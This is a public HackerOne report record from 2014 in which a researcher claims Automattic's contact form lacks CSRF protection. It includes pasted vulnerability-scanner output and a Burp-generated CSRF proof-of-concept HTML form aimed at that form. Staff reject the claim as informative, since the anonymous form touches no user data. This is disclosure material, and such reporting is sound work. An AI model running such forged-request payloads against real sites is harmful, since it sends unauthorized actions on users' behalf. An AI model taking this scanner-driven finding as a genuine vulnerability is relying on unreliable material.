{"id":7849,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83ODQ5","url":"https://hackerone.com/reports/7849","title":"HTML form without CSRF protection","state":"Closed","substate":"informative","readable_substate":"Informative","created_at":"2014-04-17T16:43:05.326Z","submitted_at":"2014-04-17T16:43:05.326Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"0xsaikiran","url":"/0xsaikiran","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/003/607/b0693aad94cb88acbb4add78b330dbc77f7e06bc_original.JPG/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":111,"url":"https://hackerone.com/automattic","handle":"automattic","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Automattic","twitter_handle":"","website":"https://automattic.com","about":"WordPress.com, VaultPress, Akismet, Gravatar, WooCommerce, Polldaddy, Tumblr and more!"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2014-07-08T10:00:27.595Z","bug_reporter_agreed_on_going_public_at":"2014-05-30T10:23:54.003Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"\r\nHTML form without CSRF protection\r\n\r\nVulnerability description\r\nCross-site request forgery, also known as a one-click attack or session riding and abbreviated as CSRF or XSRF, is a type of malicious exploit of a website whereby unauthorized commands are transmitted from a user that the website trusts.\r\n\r\nThis vulnerability affects /contact. \r\n\r\nAttack details\r\nForm action: http://automattic.com/contact/\r\nForm method: POST\r\n\r\nForm inputs:\r\n\r\nyour_name [Text]\r\nyour_email [Text]\r\nblog_url [Text]\r\nsubject [Text]\r\nmessage [TextArea]\r\nsubmit [Submit]\r\n\r\n\r\n View HTTP headers \r\nRequest\r\nGET /contact/ HTTP/1.1\r\nPragma: no-cache\r\nCache-Control: no-cache\r\nReferer: http://automattic.com/contact/\r\nAcunetix-Aspect: enabled\r\nAcunetix-Aspect-Password: 082119f75623eb7abd7bf357698ff66c\r\nAcunetix-Aspect-Queries: filelist;aspectalerts\r\nHost: automattic.com\r\nConnection: Keep-alive\r\nAccept-Encoding: gzip,deflate\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36\r\nAccept: */*\r\n\r\nResponse\r\nHTTP/1.1 200 OK\r\nServer: nginx\r\nDate: Thu, 17 Apr 2014 16:08:47 GMT\r\nContent-Type: text/html; charset=UTF-8\r\nConnection: keep-alive\r\nVary: Accept-Encoding\r\nLast-Modified: Thu, 17 Apr 2014 16:08:19 GMT\r\nCache-Control: max-age=272, must-revalidate\r\nX-nananana: Batcache\r\nVary: Cookie\r\nX-hacker: If you're reading this, you should visit automattic.com/jobs and apply to join the fun, mention this header.\r\nX-Pingback: http://automattic.com/xmlrpc.php\r\nLink: \u003chttp://wp.me/Pe4R-7\u003e; rel=shortlink\r\nOriginal-Content-Encoding: gzip\r\nContent-Length: 16613\r\n View HTML response \r\n Launch the attack with HTTP Editor  Retest alert(s)  Mark this alert as a false positive \r\nThe impact of this vulnerability\r\nAn attacker may force the users of a web application to execute actions of the attacker's choosing. A successful CSRF exploit can compromise end user data and operation in case of normal user. If the targeted end user is the administrator account, this can compromise the entire web application.\r\n\r\nHow to fix this vulnerability\r\nCheck if this form requires CSRF protection and implement CSRF countermeasures if necessary.\r\n\r\npoc-\r\n\u003chtml\u003e\r\n  \u003c!-- CSRF PoC - generated by Burp Suite Professional --\u003e\r\n  \u003cbody\u003e\r\n    \u003cform action=\"http://automattic.com/contact/\" method=\"POST\"\u003e\r\n      \u003cinput type=\"hidden\" name=\"your\u0026#95;name\" value=\"saddsa\" /\u003e\r\n      \u003cinput type=\"hidden\" name=\"your\u0026#95;email\" value=\"sdasad\u0026#64;sg\u0026#46;com\" /\u003e\r\n      \u003cinput type=\"hidden\" name=\"blog\u0026#95;url\" value=\"http\u0026#58;\u0026#47;\u0026#47;www\u0026#46;google\u0026#46;co\u0026#46;in\u0026#47;\" /\u003e\r\n      \u003cinput type=\"hidden\" name=\"subject\" value=\"sadsa\" /\u003e\r\n      \u003cinput type=\"hidden\" name=\"message\" value=\"hello\" /\u003e\r\n      \u003cinput type=\"hidden\" name=\"submit\" value=\"Send\" /\u003e\r\n      \u003cinput type=\"submit\" value=\"Submit form\" /\u003e\r\n    \u003c/form\u003e\r\n  \u003c/body\u003e\r\n\u003c/html\u003e\r\n\r\n","vulnerability_information_html":"\u003cp\u003eHTML form without CSRF protection\u003c/p\u003e\n\n\u003cp\u003eVulnerability description\u003cbr\u003e\nCross-site request forgery, also known as a one-click attack or session riding and abbreviated as CSRF or XSRF, is a type of malicious exploit of a website whereby unauthorized commands are transmitted from a user that the website trusts.\u003c/p\u003e\n\n\u003cp\u003eThis vulnerability affects /contact. \u003c/p\u003e\n\n\u003cp\u003eAttack details\u003cbr\u003e\nForm action: \u003ca title=\"http://automattic.com/contact/\" href=\"/redirect?url=http%3A%2F%2Fautomattic.com%2Fcontact%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://automattic.com/contact/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nForm method: POST\u003c/p\u003e\n\n\u003cp\u003eForm inputs:\u003c/p\u003e\n\n\u003cp\u003eyour_name [Text]\u003cbr\u003e\nyour_email [Text]\u003cbr\u003e\nblog_url [Text]\u003cbr\u003e\nsubject [Text]\u003cbr\u003e\nmessage [TextArea]\u003cbr\u003e\nsubmit [Submit]\u003c/p\u003e\n\n\u003cp\u003eView HTTP headers \u003cbr\u003e\nRequest\u003cbr\u003e\nGET /contact/ HTTP/1.1\u003cbr\u003e\nPragma: no-cache\u003cbr\u003e\nCache-Control: no-cache\u003cbr\u003e\nReferer: \u003ca title=\"http://automattic.com/contact/\" href=\"/redirect?url=http%3A%2F%2Fautomattic.com%2Fcontact%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://automattic.com/contact/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nAcunetix-Aspect: enabled\u003cbr\u003e\nAcunetix-Aspect-Password: 082119f75623eb7abd7bf357698ff66c\u003cbr\u003e\nAcunetix-Aspect-Queries: filelist;aspectalerts\u003cbr\u003e\nHost: automattic.com\u003cbr\u003e\nConnection: Keep-alive\u003cbr\u003e\nAccept-Encoding: gzip,deflate\u003cbr\u003e\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36\u003cbr\u003e\nAccept: \u003cem\u003e/\u003c/em\u003e\u003c/p\u003e\n\n\u003cp\u003eResponse\u003cbr\u003e\nHTTP/1.1 200 OK\u003cbr\u003e\nServer: nginx\u003cbr\u003e\nDate: Thu, 17 Apr 2014 16:08:47 GMT\u003cbr\u003e\nContent-Type: text/html; charset=UTF-8\u003cbr\u003e\nConnection: keep-alive\u003cbr\u003e\nVary: Accept-Encoding\u003cbr\u003e\nLast-Modified: Thu, 17 Apr 2014 16:08:19 GMT\u003cbr\u003e\nCache-Control: max-age=272, must-revalidate\u003cbr\u003e\nX-nananana: Batcache\u003cbr\u003e\nVary: Cookie\u003cbr\u003e\nX-hacker: If you\u0026#39;re reading this, you should visit automattic.com/jobs and apply to join the fun, mention this header.\u003cbr\u003e\nX-Pingback: \u003ca title=\"http://automattic.com/xmlrpc.php\" href=\"/redirect?url=http%3A%2F%2Fautomattic.com%2Fxmlrpc.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://automattic.com/xmlrpc.php\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nLink: \u003ca title=\"http://wp.me/Pe4R-7\" href=\"/redirect?url=http%3A%2F%2Fwp.me%2FPe4R-7\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://wp.me/Pe4R-7\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e; rel=shortlink\u003cbr\u003e\nOriginal-Content-Encoding: gzip\u003cbr\u003e\nContent-Length: 16613\u003cbr\u003e\n View HTML response \u003cbr\u003e\n Launch the attack with HTTP Editor  Retest alert(s)  Mark this alert as a false positive \u003cbr\u003e\nThe impact of this vulnerability\u003cbr\u003e\nAn attacker may force the users of a web application to execute actions of the attacker\u0026#39;s choosing. A successful CSRF exploit can compromise end user data and operation in case of normal user. If the targeted end user is the administrator account, this can compromise the entire web application.\u003c/p\u003e\n\n\u003cp\u003eHow to fix this vulnerability\u003cbr\u003e\nCheck if this form requires CSRF protection and implement CSRF countermeasures if necessary.\u003c/p\u003e\n\n\u003cp\u003epoc-\u003cbr\u003e\n\u0026lt;html\u0026gt;\u003cbr\u003e\n  \u0026lt;!-- CSRF PoC - generated by Burp Suite Professional --\u0026gt;\u003cbr\u003e\n  \u0026lt;body\u0026gt;\u003cbr\u003e\n    \u0026lt;form action=\u0026quot;http://automattic.com/contact/\u0026quot; method=\u0026quot;POST\u0026quot;\u0026gt;\u003cbr\u003e\n      \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;your\u0026amp;#95;name\u0026quot; value=\u0026quot;saddsa\u0026quot; /\u0026gt;\u003cbr\u003e\n      \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;your\u0026amp;#95;email\u0026quot; value=\u0026quot;sdasad\u0026amp;#64;sg\u0026amp;#46;com\u0026quot; /\u0026gt;\u003cbr\u003e\n      \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;blog\u0026amp;#95;url\u0026quot; value=\u0026quot;http\u0026amp;#58;\u0026amp;#47;\u0026amp;#47;www\u0026amp;#46;google\u0026amp;#46;co\u0026amp;#46;in\u0026amp;#47;\u0026quot; /\u0026gt;\u003cbr\u003e\n      \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;subject\u0026quot; value=\u0026quot;sadsa\u0026quot; /\u0026gt;\u003cbr\u003e\n      \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;message\u0026quot; value=\u0026quot;hello\u0026quot; /\u0026gt;\u003cbr\u003e\n      \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;submit\u0026quot; value=\u0026quot;Send\u0026quot; /\u0026gt;\u003cbr\u003e\n      \u0026lt;input type=\u0026quot;submit\u0026quot; value=\u0026quot;Submit form\u0026quot; /\u0026gt;\u003cbr\u003e\n    \u0026lt;/form\u0026gt;\u003cbr\u003e\n  \u0026lt;/body\u0026gt;\u003cbr\u003e\n\u0026lt;/html\u0026gt;\u003c/p\u003e\n","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2014-06-28T14:46:26.245Z","allow_singular_disclosure_after":-205257951.8989399,"singular_disclosure_allowed":true,"vote_count":2,"voters":["mygf","robdollard"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":32139,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi there. Thanks for reporting, but I'm not sure there's really a security issue here. Forms can even be submitted anonymously, so unless I'm missing something, there's no ability to gain elevated privilege here and thus no exploit vector. If I'm misunderstanding, I'd be grateful for clarification. ","markdown_message":"\u003cp\u003eHi there. Thanks for reporting, but I\u0026#39;m not sure there\u0026#39;s really a security issue here. Forms can even be submitted anonymously, so unless I\u0026#39;m missing something, there\u0026#39;s no ability to gain elevated privilege here and thus no exploit vector. If I\u0026#39;m misunderstanding, I\u0026#39;d be grateful for clarification. \u003c/p\u003e\n","automated_response":false,"created_at":"2014-04-17T21:05:45.141Z","updated_at":"2014-04-17T21:05:45.141Z","actor":{"username":"dllh","cleared":false,"url":"/dllh","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":32558,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"yeah just making u aware of dat issue...so dat u make it more secure...by chance later on if u update the page with important info and forget to put csrf protection ...it may happn","markdown_message":"\u003cp\u003eyeah just making u aware of dat issue...so dat u make it more secure...by chance later on if u update the page with important info and forget to put csrf protection ...it may happn\u003c/p\u003e\n","automated_response":false,"created_at":"2014-04-18T11:59:21.001Z","updated_at":"2014-04-18T11:59:21.001Z","actor":{"username":"0xsaikiran","cleared":false,"url":"/0xsaikiran","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/607/b0693aad94cb88acbb4add78b330dbc77f7e06bc_original.JPG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":61045,"is_internal":false,"editable":false,"type":"Activities::BugInformative","message":"Thanks for the report. As mentioned earlier, there is no data related to the current user (thus no user impersonation) being used in this contact form.","markdown_message":"\u003cp\u003eThanks for the report. As mentioned earlier, there is no data related to the current user (thus no user impersonation) being used in this contact form.\u003c/p\u003e\n","automated_response":false,"created_at":"2014-05-29T14:46:26.280Z","updated_at":"2014-05-29T14:46:26.280Z","actor":{"username":"xknown","cleared":false,"url":"/xknown","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":61879,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2014-05-30T10:23:54.022Z","updated_at":"2014-05-30T10:23:54.022Z","actor":{"username":"0xsaikiran","cleared":false,"url":"/0xsaikiran","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/607/b0693aad94cb88acbb4add78b330dbc77f7e06bc_original.JPG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":85907,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2014-07-08T10:00:27.605Z","updated_at":"2014-07-08T10:00:27.605Z","actor":{"url":"/automattic","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Automattic"}},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}